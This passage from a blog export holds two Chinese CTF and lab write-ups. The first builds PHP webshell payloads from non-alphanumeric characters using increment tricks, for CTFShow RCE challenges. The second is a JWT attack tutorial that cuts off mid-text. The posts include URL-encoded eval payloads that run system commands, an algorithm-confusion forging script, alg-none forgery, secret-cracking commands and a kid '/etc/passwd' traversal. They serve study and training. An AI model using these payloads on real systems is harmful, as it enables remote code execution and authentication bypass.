超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。\n这里可以看出NAN表示的是未被定义的值，所以我们这里可以通过a/a这种方式构造，如果字母也被ban，我们也可以借助其他字符，比如_/_，这个时候也可以得到NAN，同理，INF也可以通过1/a的方式获取。\n知识点2\n\n\n\n\n\n\n\n\n这里需要说明一下，笔者小白，对这个不太了解，然后可能这并不算什么知识点，还请各位大师傅多多担待\n我们在构造$_POST中的_时，正常操作的话是这样，$a=&#39;_&#39;.$b(假设这里$b就是POST)，然后这个时候如果&#39;被ban，看似这里是无法再利用了，但其实，我们直接写$a=_.$b也是可以的，这个时候效果同上而且缩短了字符长度。\nCTF赛题实战CTFshow吃瓜杯[shellme_Revenge]题目环境如下https://ctf.show/challenges#shellme_Revenge-1483进入环境后发现phpinfo()，找找有没有什么信息搜索hint后发现提示了?looklook，那我们这里可以猜出大概率是给了个访问的参数，我们在URL后加上?looklook=1，此时获取到源码\n&lt;?php\nerror_reporting(0);\nif ($_GET['looklook'])&#123;\n    highlight_file(__FILE__);\n&#125;else&#123;\n    setcookie(\"hint\", \"?looklook\", time()+3600);\n&#125;\nif (isset($_POST['ctf_show'])) &#123;\n    $ctfshow = $_POST['ctf_show'];\n    if (is_string($ctfshow) || strlen($ctfshow) &lt;= 107) &#123;\n        if (!preg_match(\"/[!@#%^&amp;*:'\\\"|`a-zA-BD-Z~\\\\\\\\]|[4-9]/\",$ctfshow))&#123;\n            eval($ctfshow);\n        &#125;else&#123;\n            echo(\"fucccc hacker!!\");\n        &#125;\n    &#125;\n&#125; else &#123;\n    phpinfo();\n&#125;\n?>\n过滤了很多，^和~被过滤，所以异或和取反不可行，但可用的还有一些字符，$ _ 1 2 3 C这几个均未被过滤，所以我们这里可以尝试一下通过自增构造，这里限制了长度，要求长度小于107，所以我们这里的话使用构造较短的payload，$_GET[0]($_GET[1])这个相对来说较短，所以这里的话就可以尝试去构造这个payload，我一开始的payload总是不够短，参考了其他师傅的payload后最终构造如下\n&lt;?php\n$_=C;\n$_++;//D\n$C1=++$_;//E\n$_++;//F\n$C=++$_.$C1;//GE\n$_=(C/C.C)[0];//C/C即可得到NAN，但此时的它不是字符串，需要拼接一个字符才能变成字符串，然后第一位就是N\n$_++;//O\n$_++;//P\n$_++;//Q\n$_++;//R\n$_++;//S\n$_++;//T\n$C=_.$C.$_;\n$$C[1]($$C[2]);\nvar_dump($C);//$_GET[0]($GET[1])\n我这里说一下这里缩短长度的几个点，首先一个就是获取字母，比如获取字符E那里，之前我写的话都是$_++;$C1=$_，这种相对来说长度就比较长了，当我们直接这样写，即$C1=++$_时，此时不仅$C1被赋值为E，同时$_也进行了一次自增，因为++$_是先做运算，再赋值的，所以这里是一个缩短长度的点。然后第二个就是获取T这个字符，我们知道T在英语字母中是较靠后的，如果从前靠后只靠自增，字符就过长了，我们这里想到NAN这个字符N是离T较近的，所以我们可以尝试构造N然后再自增获取T，了解到0/0是NAN，这里的C/C也就是NAN，所以我们对他进行一个拼接后获取第一个字符就可以得到N，而后再通过自增即可获取T。第三个点的话就是拼接_GET处，这里的_不用单引号直接拼接也是可以的，这样就省去了两个字符。\n接下来将刚刚构造的payload删去换行这些，然后弄到一行后再进行URL编码，最终payload\nGET:\n1=passthru&amp;2=ls /\nPOST:\nctf_show=%24_%3DC%3B%24_%2B%2B%3B%24C1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24C%3D%2B%2B%24_.%24C1%3B%24_%3D(C%2FC.C)%5B0%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24C%3D_.%24C.%24_%3B%24%24C%5B1%5D(%24%24C%5B2%5D)%3B\n\n成功执行ls /命令，接下来读flag即可\nCTFShow[RCE挑战2]环境如下https://ctf.show/challenges#RCE2进入靶场，代码如下\n&lt;?php\n//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nif (isset($_POST['ctf_show'])) &#123;\n    $ctfshow = $_POST['ctf_show'];\n    if (is_string($ctfshow)) &#123;\n        if (!preg_match(\"/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\\-&lt;\\?>\\\"|`~\\\\\\\\]/\",$ctfshow))&#123;\n            eval($ctfshow);\n        &#125;else&#123;\n            echo(\"Are you hacking me AGAIN?\");\n        &#125;\n    &#125;else&#123;\n        phpinfo();\n    &#125;\n&#125;\n?>\n这里的话可以看到$、[]、&#39;以及_这几个字符是没有被ban的，所以这里我们可以同之前一样，以自增方式构造命令执行语句，直接利用上面的payload进行尝试\nGET:\n_=system&amp;__=cat /f*\nPOST:\n%24_%3D%5B%5D.''%3B%24_%3D%24_%5B''%3D%3D'%24'%5D%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24___%3D%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24___.%24__.%24_%3B%24_%3D'_'.%24_%3B%24%24_%5B_%5D(%24%24_%5B__%5D)%3B\n\nCTFShow[RCE挑战3]&lt;?php\n//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nif (isset($_POST['ctf_show'])) &#123;\n    $ctfshow = $_POST['ctf_show'];\n    if (is_string($ctfshow) &amp;&amp; strlen($ctfshow) &lt;= 105) &#123;\n        if (!preg_match(\"/[a-zA-Z2-9!'@#%^&amp;*:&#123;&#125;\\-&lt;\\?>\\\"|`~\\\\\\\\]/\",$ctfshow))&#123;\n            eval($ctfshow);\n        &#125;else&#123;\n            echo(\"Are you hacking me AGAIN?\");\n        &#125;\n    &#125;else&#123;\n        phpinfo();\n    &#125;\n&#125;\n?>\n这里限制了长度为105，然后看过滤的话这里的^和~被ban，所以继续用自增，然后这个时候考虑的$_GET中的T字符相对G和E来说是较靠后的，如果用自增获取会占用很多字符，所以这里可以去尝试构造$_POST，这四个字符相对来说还是挨的比较近的，所以我这里打算构造的语句是$_POST[0]($_POST[1])，接下来我们就可以去构造了。\n首先的话，我们考虑到这个POST四个字符都是偏后的，同时我们这里是有数字0的，所以我们这里可以用0/0来获取float(NAN)，接下来需要把他转换为字符串，因为这个是无法利用的，然后我们这里可以看到&#39;和&quot;都被ban了，所以不能再用，不过我们这里拼接的话，其实随便拼接个什么都可以，我们这里拼接一个下划线也是可以的，所以第一步就有了\n&lt;?php\n$_=(0/0)._;//NAN\n$_=$_[0];//N\n这个时候就成功获取到了字符N，接下来就是先进行赋值获取一个_，然后再通过自增获取POST，最终的话得到的payload如下\n&lt;?php\n$_=(0/0)._;//NAN\n$_=$_[0];//N\n$_1=++$_;//O  ++$_是先进行自增，而后取值，所以这里$_1就是O\n$__=_;//_  首先获取_\n$__.=++$_;//_P  通过自增获取P \n$__.=$_1;//_PO  获取O\n$_++;//Q \n$_++;//R\n$__.=++$_;//_POS 通过自增获取S\n$__.=++$_;//_POST  通过自增获取T\n$$__[0]($$__[1]);//$_POST[0]($_POST[1])\n接下来将代码放入一行\n$_=(0/0)._;$_=$_[0];$_1=++$_;$__=_;$__.=++$_;$__.=$_1;$_++;$_++;$__.=++$_;$__.=++$_;$$__[0]($$__[1]);\n可以看到这里是103，小于105，接下来进行URL编码，然后去环境里尝试一下成功执行ls /命令\nCTFShow[RCE挑战4]源码如下\n&lt;?php\n//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nif (isset($_POST['ctf_show'])) &#123;\n    $ctfshow = $_POST['ctf_show'];\n    if (is_string($ctfshow) &amp;&amp; strlen($ctfshow) &lt;= 84) &#123;\n        if (!preg_match(\"/[a-zA-Z1-9!'@#%^&amp;*:&#123;&#125;\\-&lt;\\?>\\\"|`~\\\\\\\\]/\",$ctfshow))&#123;\n            eval($ctfshow);\n        &#125;else&#123;\n            echo(\"Are you hacking me AGAIN?\");\n        &#125;\n    &#125;else&#123;\n        phpinfo();\n    &#125;\n&#125;\n?>\n\n可以看到本题进一步限制了长度，要求长度小于84位，然后这里的话需要说一些缩短长度的方法。首先就是我们之前得到字符N是这样的,$_=(0/0)._;$_=$_[0];，然后这个的话我们其实是可以进行一个缩短的，我们可以写成这个样子$_0=(_/_._)[0];,这个(_/_._)就可以直接得到NAN，然后我们再加上一个[0]，就可以缩短长度然后其他就是对自增这些进行一下缩短，我构造的payload如下\n&lt;?php\n$_0=(_/_._)[0];//NAN\n$_=++$_0;//O\n$__=_;//_\n$__.=++$_.$_0;//_P\n$_++;//Q\n$_++;//R\n$__.=++$_;//_POS\n$__.=++$_;//_POST\n$$__[0]($$__[_]);//$_POST[0]($_POST[_])\n可是这个时候当我把他放到一行中，我发现它的长度是91，还是大于84，因此这个是不可用的，这个时候看到变量名$_0和$__占了两个单位长度，如果我们可以用一个字符来表示它，是不是就可以成功缩短长度呢，然后这个时候就考虑到可以使用不可见字符然后我们在URL编码表中随便找两个，我这里就用%DE和%DF了，然后分别对变量名进行一个替换\n&lt;?php_\n$%DF=(_/_._)[0];//NAN\n$_=++$%DF;//O\n$%DE=_;//_\n$%DE.=++$_.$%DF;//_P\n$_++;//Q\n$_++;//R\n$%DE.=++$_;//_POS\n$%DE.=++$_;//_POST\n$$%DE[0]($$%DE[_]);//$_POST[0]($_POST[_])\n然后接下来写到一行中\n$%DF=(_/_._)[0];$_=++$%DF;$%DE=_;$%DE.=++$_.$%DF;$_++;$_++;$%DE.=++$_;$%DE.=++$_;$$%DE[0]($$%DE[_]);\n因为涉及到不可见字符，然后它是URL编码过的，所以我们这里不能使用整体编码，需要单独对部分内容进行URL编码，不过这里需要编码的也就是++，对++URL编码即可，因此最终payload如下\nPOST：\n$%DF=(_/_._)[0];$_=%2B%2B$%DF;$%DE=_;$%DE.=%2B%2B$_.$%DF;$_%2B%2B;$_%2B%2B;$%DE.=%2B%2B$_;$%DE.=%2B%2B$_;$$%DE[0]($$%DE[_]);&amp;0=system&amp;_=cat /f*\n\nCTFShow[RCE挑战5]源码如下\n&lt;?php\n//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nif (isset($_POST['ctf_show'])) &#123;\n    $ctfshow = $_POST['ctf_show'];\n    if (is_string($ctfshow) &amp;&amp; strlen($ctfshow) &lt;= 73) &#123;\n        if (!preg_match(\"/[a-zA-Z0-9!'@#%^&amp;*:&#123;&#125;\\-&lt;\\?>\\\"|`~\\\\\\\\]/\",$ctfshow))&#123;\n            eval($ctfshow);\n        &#125;else&#123;\n            echo(\"Are you hacking me AGAIN?\");\n        &#125;\n    &#125;else&#123;\n        phpinfo();\n    &#125;\n&#125;\n?>\n这里的话将数字全ban了，同时要求字符串长度小于73然后这里的话根本没思路，参考过官方wp后，得知当gettext拓展开启时，_()就相当于gettext()，可以获取其中的内容，所以我们这里可以通过这种方式获取到字符N，然后我们构造的payload如下\n&lt;?php\n$a=_(a/a)[a];//N\n$_=++$a;//O\n$b=_.++$a.$_;//_PO\n$a++;//Q\n$a++;//R\n$b.=++$a.++$a;//_POST\n$$b[a]($$b[_]);//$_POST[a]($_POST[_])\n接下来用不可见字符分别替换a和b，然后放至一行之中，得到\n$%DE=_(%DE/%DE)[%DE];$_=++$%DE;$%DF=_.++$%DE.$_;$%DE++;$%DE++;$%DF.=++$%DE.++$%DE;$$%DF[%DE]($$%DF[_]);\n再对++进行URL编码，得到\n$%DE=_(%DE/%DE)[%DE];$_=%2B%2B$%DE;$%DF=_.%2B%2B$%DE.$_;$%DE%2B%2B;$%DE%2B%2B;$%DF.=%2B%2B$%DE.%2B%2B$%DE;$$%DF[%DE]($$%DF[_]);\n成功获取flag\n参考链接https://blog.csdn.net/miuzzx/article/details/127830557https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=2#reply-listhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum.htmlhttps://ctf-show.feishu.cn/docx/ToiJd70SboRn52xhn3WcJsfjnah\n","slug":"从CTFShow[RCE挑战]中学习自增构造webshell","date":"2022-12-07T15:26:30.000Z","categories_index":"WEB知识","tags_index":"CTF","author_index":"quan9i"},{"id":"a302f7d4a9c4a8ebcf973c7c3ec757d6","title":"浅析JWT Attack","content":"声明文章首发于合天安全实验室https://mp.weixin.qq.com/s/WvVgavjJMXSZQsVFtHEOhA\n前言在2022祥云杯时遇到有关JWT的题，当时没有思路，对JWT进行学习后来对此进行简单总结，希望能对正在学习JWT的师傅们有所帮助。\nJWTJWT，即JSON WEB TOKEN，它是一种用于通信双方之间传递安全信息的简洁的、URL安全的表述性声明规范，是一种标准化的格式，用于在系统之间发送经过加密签名的JSON数据，·理论上可以包含任何类型的数据，但最常用于发送关于用户的信息（“声明”），以进行身份认证、会话处理和访问控制。\n简单了解了它的定义后，我们接下来来看一下JWT的组成部分它分为三个部分，如下所示\n1、Headers:头部\n2、Payload:有效载荷\n3、Signature:签名\n这三个部分以.符号来连接，所以JWT的格式通常是xxx.yyy.zzz这种样子\nHeadersHeaders通常由两部分组成，令牌的类型和签名算法，常见的算法有很多种，例如 HMAC SHA256 或 RSA。但它也还有一个kid参数，这是一个可选参数，全称是key ID，它用于指定加密算法的密钥。\n示例如下\newogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9\n这就是一个Headers，当我们对它进行Base64解码就可以看到它的具体内容，具体如下\n&#123;\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n&#125;\nalg指的就是算法，这里的算法就是HS256，typ指的是令牌类型。这里需要说明一点，就是明文在加密时其实采用的是Base64URL加密，这种加密方式并非Base64encode+URLencode，而是对一些特殊字符进行了替换，具体说明如下\n\n\n\n\n\n\n\n\n\nJWT 作为一个令牌(token)，有些场合可能会放到 URL(比如 api.example.com/?token=xxx)。Base64有三个字符+、/和=，在 URL 里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是 Base64URL 算法。\nPayload有效载荷就是存放有效信息的地方，其中包含声明。声明包含三个部分1、已注册声明这个部分的话就是已经预先定义过的声明，常见的声明主要有以下几种\niss: jwt签发者\nsub: jwt所面向的用户\naud: 接收jwt的一方\nexp: jwt的过期时间，这个过期时间必须要大于签发时间\nnbf: 定义在什么时间之前，该jwt都是不可用的.\niat: jwt的签发时间\njti: jwt的唯一身份标识，主要用来作为一次性token,从而回避重放攻击。\n2、公共的声明这些可以由使用 JWT 的人随意定义，一般用于添加用户的相关信息或其他业务需要的必要信息。但不建议添加敏感信息，因为该部分在客户端可进行解码.3、私有的声明这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息。\n示例如下\newoJInN1YiI6ICJhZG1pbiIsCiAgICAidXNlcl9yb2xlIiA6ICJhZG1pbiIsCiAgICAiaXNzIjogImFkbWluIiwKICAgICJpYXQiOiAxNTczNDQwNTgyLAogICAgImV4cCI6IDE1NzM5NDAyNjcsIAogICAgIm5iZiI6IDE1NzM0NDA1ODIsIAogICAgImp0aSI6ICJkZmY0MjE0MTIxZTgzMDU3NjU1ZTEwYmQ5NzUxZDY1NyIgICAKfQ\n进行base64URL解码，结果如下\n&#123;\n\t\"sub\": \"admin\",\t\t\t\t//jwt所面向的用户\n    \"user_role\" : \"admin\",    \t//当前登录用户\n    \"iss\": \"admin\",          \t//该JWT的签发者,有些是URL\n    \"iat\": 1573440582,        //签发时间\n    \"exp\": 1573940267,        //过期时间\n    \"nbf\": 1573440582,        //该时间之前不接收处理该Token\n    \"jti\": \"dff4214121e83057655e10bd9751d657\"   //Token唯一标识\n&#125;\nSignature由于头部和有效载荷以明文形式存储，因此，需要使用签名来防止数据被篡改。所以这部分是一个签证信息，这个签证信息由三部分组成\n1、header (base64URL编码)\n2、payload (base64URL编码)\n3、secret（密钥）\n它的计算方式如下\nSignature=HMACSHA256(base64UrlEncode(header) + \".\" +base64UrlEncode(payload),secret)\n//假设这里是HS256算法，如果是其他算法的话开头设置为其他算法即可\n\n现在了解了JWT的大致作用和其组成，接下来来学习一下JWT攻击。\nJWT 攻击JWT攻击有多种情况，现在来对其进行逐一讲解。\n敏感信息泄露\n\n\n\n\n\n\n\n\nJWT保证的是数据传输过程中的完整性而不是机密性。\n因为JWT的payload部分是使用Base64url编码的，所以它其实是相当于明文传输的，当payload中携带了敏感信息时，我们对payload部分进行Base64url解码，就可以读取到payload中携带的敏感信息。\n靶场演示题目链接https://www.ctfhub.com/#/skilltree题目描述如下\n\n\n\n\n\n\n\n\n\nJWT 的头部和有效载荷这两部分的数据是以明文形式传输的，如果其中包含了敏感信息的话，就会发生敏感信息泄露。试着找出FLAG。格式为 flag{}\n进入环境后发现一个登录框随便输入账号密码，登录后发现界面如下查看此时的JWT想到题目中说头部和载荷可能会有敏感泄露，将值取出分别进行Base64URL解码两处拼接一下，得到ctfhub&#123;bb89d985db8cea6a2f2d34cb&#125;\n算法修改攻击首先来简述一下JWT中两个常用的加密算法\n\n\n\n\n\n\n\n\n\nHMAC(HS256):是一种对称加密算法，使用秘密密钥对每条消息进行签名和验证RSA(RS256)：是一种非对称加密算法，使用私钥加密明文，公钥解密密文。\n从上面不难看出，HS256自始至终只有一个密钥，而RS256是有两个密钥的。在通常情况下，HS256的密钥我们是不能取到的，RS256的密钥也是很难获得的，RS256的的公钥相对较容易获取，但无论是HS256加密还是RS256加密，都是无法实现伪造JWT的，但当我们修改RSA256算法为HS256算法时，后端代码会使用公钥作为密钥，然后用HS256算法验证签名，如果我们此时有公钥，那么此时我们就可与实现JWT的伪造。\n靶场演示题目链接https://www.ctfhub.com/#/skilltree\n题目描述\n\n\n\n\n\n\n\n\n\n有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。\n进入环境后发现题目代码\nclass JWTHelper &#123;\n  public static function encode($payload=array(), $key='', $alg='HS256') &#123;\n    return JWT::encode($payload, $key, $alg);\n  &#125;\n  public static function decode($token, $key, $alg='HS256') &#123;\n    try&#123;\n            $header = JWTHelper::getHeader($token);\n            $algs = array_merge(array($header->alg, $alg));\n      return JWT::decode($token, $key, $algs);\n    &#125; catch(Exception $e)&#123;\n      return false;\n    &#125;\n    &#125;\n    public static function getHeader($jwt) &#123;\n        $tks = explode('.', $jwt);\n        list($headb64, $bodyb64, $cryptob64) = $tks;\n        $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));\n        return $header;\n    &#125;\n&#125;\n\n$FLAG = getenv(\"FLAG\");\n$PRIVATE_KEY = file_get_contents(\"/privatekey.pem\");\n$PUBLIC_KEY = file_get_contents(\"./publickey.pem\");\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') &#123;\n    if (!empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) &#123;\n        $token = \"\";\n        if($_POST['username'] === 'admin' &amp;&amp; $_POST['password'] === $FLAG)&#123;\n            $jwt_payload = array(\n                'username' => $_POST['username'],\n                'role'=> 'admin',\n            );\n            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');\n        &#125; else &#123;\n            $jwt_payload = array(\n                'username' => $_POST['username'],\n                'role'=> 'guest',\n            );\n            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');\n        &#125;\n        @setcookie(\"token\", $token, time()+1800);\n        header(\"Location: /index.php\");\n        exit();\n    &#125; else &#123;\n        @setcookie(\"token\", \"\");\n        header(\"Location: /index.php\");\n        exit();\n    &#125;\n&#125; else &#123;\n    if(!empty($_COOKIE['token']) &amp;&amp; JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false) &#123;\n        $obj = JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY);\n        if ($obj->role === 'admin') &#123;\n            echo $FLAG;\n        &#125;\n    &#125; else &#123;\n        show_source(__FILE__);\n    &#125;\n&#125;\n?>\n简单的看一下，大致意思就是当以用户名为admin，密码不是$flag时，此时登录后JWT中payload的role是guest，而只有当role为admin时才能够得到Flag，所以我们这里肯定是需要伪造JWT的，我们先以admin为用户名，随便输入密码登录一下此时得到JWT，将其拿去解密网站https://jwt.io解密一下发现加密方式是RS256非对称加密，想到在登录时，下方给出了公钥所以这里就可以尝试更改算法为HS256，以公钥作为密钥来进行签名和验证，因此我们构造一个伪造JWT的脚本，内容如下\nimport jwt\nimport base64\n\npublic =\"\"\"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqizf1rnxqfeyCAp52TQO\n3uEyeB1HzqqbO8FBHWqLlhgmyPFqaopXVhZryzP+Sd6a3iQd8xeD7URswPHE4roA\nkbI1GMta9zAdD1yPtp//JNZ55hx1iFY2n9gw2u8VL64n9sCc56H46L3W52Z37kvW\nq5LuoLAuyJpP7Ofadt7biWaeXibZGQjPwlbCy31DyxdDFCt8pVrajVI97w3amHBU\nXhd0Ku+DOq9hjadtQbTkbIkAUR84yqt+25EXd/rg1w8we9ysNcTjAeUayRGPuQmX\nUWJaFpsvuL7WeUb2xJqvieFwsCQppS1ZgaoRc0F835K+G3s3qWRi4AnvZxryfTzl\nawIDAQAB\n-----END PUBLIC KEY-----\n\"\"\"\npayload=&#123; \"username\": \"admin\",\"role\": \"admin\"&#125;\nprint(jwt.encode(payload, key=public, algorithm='HS256'))\n此时运行完后发现报错这个是因为源代码中进行了校验，我们简单设置一下即可,源代码文件地址如下\n/usr/lib/python3/dist-packages/jwt/algorithms.py\n我们在它的校验前面增加这样一句话\ninvalid_strings=[]\n此时保存退出，再运行文件即可得到新JWT将新的JWT拿到网站中替换旧的JWT，刷新网站即可得到flag\n未验证签名当用户端提交请求给应用程序，服务端可能没有对token签名进行校验，这样，攻击者便可以通过提供无效签名简单地绕过安全机制，此时就造成了越权漏洞的出现。假设现有payload如下\n&#123; \n  \"iat\": 1668871293,\n  \"exp\": 1668878493,\n  \"nbf\": 1668871293,\n  \"sub\": \"quan9i\",\n&#125;\n这里的quan9i是普通用户，按理说的话它是无法访问到管理员的界面的，但由于这里的签名是没有验证的，当我们修改payload时，这个JWT仍然有效，所以我们修改payload如下\n&#123; \n  \"iat\": 1668871293,\n  \"exp\": 1668878493,\n  \"nbf\": 1668871293,\n  \"sub\": \"admin\",\n&#125;\n此时就垂直越权，变成了管理员用户，可以访问管理员的界面。\n靶场演示题目环境https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature题目描述\n\n\n\n\n\n\n\n\n\n本实验使用基于 JWT 的机制来处理会话。由于实施缺陷，服务器不会验证它收到的任何 JWT 的签名。\n题目要求\n\n\n\n\n\n\n\n\n\n要解决实验室问题，请修改您的会话令牌以获取对管理面板的访问权限/admin，然后删除用户carlos。\n题目条件\n\n\n\n\n\n\n\n\n\n您可以使用以下凭据登录到您自己的帐户：wiener:peter\n打开环境后发现Cookie中没什么东西，但想到题目给出了账号，那就先找登录点，发现有个My account点击查看，发现是登录界面，将刚刚题目条件中所给的用户名和密码放入此时查看cookie具体内容为\neyJraWQiOiIxYmE5NjA0Ny0wNjBiLTQ0MTAtODg1NC01YWYxYTQ2ZTljYWEiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTI5NzgxMH0.JMb3Ttl7WLoVrTfcEq03VIafh7zDMu5_nhMtPc3qnhgENSl1WbMAMFfeTa-v0jS69A13W-J3_ccslHu25OW_SRPAq2GuAUoFfEGtthnP-PaDWFN2_UIIcaeAx8rj8bNy65apX37EnTx-sPo274XjW9hQgTRLT1ifHtfihvTzoOY94_2bLaR4JwSUoyoi_kXZW4IndvhqpHA2kn8jw2aQOJCCCjeHh2r_CDDQA1hrSKeP2FgIq07wagLZqzkG6ATexINTNI_4jwpO8Jy1U-l0voPQQ6g111GCkBDhhkCagnm4zh-_Kl2nDD-Xjp74VVZDCNojbLoeS2Y6RGPZ4GR28w\n对第一个.后和第二个.之前的内容进行解码（此部分内容为有效载荷）得到\n&#123;\"iss\":\"portswigger\",\"sub\":\"wiener\",\"exp\":1669297810&#125;\n题目提示了这里不校验签名，所以我们修改payload如下\n&#123;\"iss\":\"portswigger\",\"sub\":\"administrator\",\"exp\":1669297810&#125;\n再对其进行Base64URL编码，替换掉原来的payload，此时就得到了新的JWT，将新的JWT放入session中，重新访问此界面，发现多了一个功能点发现可以删除用户任务完成。\n空加密算法这里需要先介绍一些利用的知识点\n\n\n\n\n\n\n\n\n\n将signature置空。利用node的jsonwentoken库已知缺陷：当jwt的signature为null或undefined时，jsonwebtoken会采用algorithm为none进行验证\nJWT支持使用空加密算法，可以在header中指定alg为none，此时只要把signature设置为空，提交到服务器，任何token都可以通过服务器的验证。\n假设现有JWT(解码后的，无signature的)如下\n&#123;\n    \"alg\" : \"Hs256\",\n    \"typ\" : \"jwt\"\n&#125;\n\n&#123;\n    \"user\" : \"quan9i\"\n&#125;\n这里我们指定alg为None，修改Payload中的user为admin，如下所示\n&#123;\n    \"alg\" : \"None\",\n    \"typ\" : \"jwt\"\n&#125;\n\n&#123;\n    \"user\" : \"admin\"\n&#125;\n此时再进行Base64URL编码，就可以实现越权，得到管理员才可以访问的界面。\n靶场演示靶场环境https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification题目描述\n\n\n\n\n\n\n\n\n\n本实验使用基于 JWT 的机制来处理会话。服务器未安全地配置为接受未签名的 JWT。\n题目要求\n\n\n\n\n\n\n\n\n\n要解决实验室问题，请修改您的会话令牌以获取对管理面板的访问权限/admin，然后删除用户carlos。\n题目条件\n\n\n\n\n\n\n\n\n\n您可以使用以下凭据登录到您自己的帐户：wiener:peter\n进入环境后先去登录得到JWT，题目提示了接受未签名的JWT，所以将第二个点后的内容直接删除，而后再对前面内容进行Base64解码\n&#123;\"kid\":\"16adc077-c753-4bbe-a9df-46688c01ac46\",\"alg\":\"RS256\"&#125;.&#123;\"iss\":\"portswigger\",\"sub\":\"wiener\",\"exp\":1669304815&#125;.\n修改headers中的alg为none，修改payload中的sub为administrator，然后分别进行Base64URL编码，即可得到新的JWT，在网站中对JWT进行替换，接下来再次访问此网站，发现新功能点。点进去发现有删除用户的功能任务完成。\n爆破密钥这个的话其实就是使用工具来对密钥进行爆破，从而实现越权。这个的话在参考过其他师傅的文章后发现是有一些条件的，具体如下所示\n1、JWT使用的加密算法是HS256加密算法\n2、一段有效的、已签名的token\n3、签名用的密钥不复杂（弱密钥）\n然后这里还需要介绍一下爆破密钥用的工具，链接如下https://github.com/brendan-rius/c-jwt-cracker安装方式如下所示\n1、git clone https://github.com/brendan-rius/c-jwt-cracker #下载\n2、make #编译\n使用方式如下 \n./jwtcrack JWT \n\n这是一个，还有一个爆破工具，可以引用字典，链接如下https://github.com/Sjord/jwtcrack安装方式如下所示\n1、git clone https://github.com/Sjord/jwtcrack \n2、pip install PyJWT tqdm\n它的使用方式如下\npython3 crackjwt.py JWT dictionary.txt //字典文件是自己写入的\n靶场演示题目描述\n\n\n\n\n\n\n\n\n\n本实验使用基于 JWT 的机制来处理会话。它使用极弱的密钥来签署和验证令牌。这可以很容易地使用一个包含常见secret的单词表来暴力破解。\n题目要求\n\n\n\n\n\n\n\n\n\n要解决实验室问题，请首先暴力破解网站的密钥。获得此后，使用它签署修改后的会话令牌，使您可以访问管理面板/admin，然后删除用户carlos\n题目条件\n\n\n\n\n\n\n\n\n\n您可以使用以下凭据登录到您自己的帐户：wiener:peter\n进入环境后，依旧是先登录获取当前JWT因为题目已经提示了这里用的是暴力破解，所以我们用刚刚提到的工具，来爆破一下密钥\n./jwtcrack eyJraWQiOiIyZjRlMzM0Yy1lMzZjLTRhNWQtOWVjYi03ZDhkZDJhYThlYjMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTMwNzYwNn0.iMBR0rqiUQKT1a1YoonpXNY5hCNz16okJB9tbog0QRE\n这里爆破多次均未得到密钥，所以我们选择换另一个工具，自己找个字典来进行爆破字典链接https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list接下来使用工具指定字典来进行爆破\npython3 crackjwt.py  eyJraWQiOiIyZjRlMzM0Yy1lMzZjLTRhNWQtOWVjYi03ZDhkZDJhYThlYjMiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY2OTMwNzYwNn0.iMBR0rqiUQKT1a1YoonpXNY5hCNz16okJB9tbog0QRE dictionary.txt\n得到密钥为secret1进入解码网站https://jwt.io,对jwt进行解码修改payload中的sub为administrator，再在下方写入密钥secret1，生成新JWT拿到网站中替换原JWT，发现新功能点访问后发现可以删除用户任务完成。\nKid参数注入前文在简述Headers提到，它还有一个可选参数kid，当Headers中存在这个参数时，我们可以通过修改这个参数实现目录遍历、SQL注入等攻击\n#目录遍历\n&#123;\n    \"kid\" : \"/etc/passwd\"\n&#125;\nKid参数的逻辑是类似于sql=&quot;select * from table where 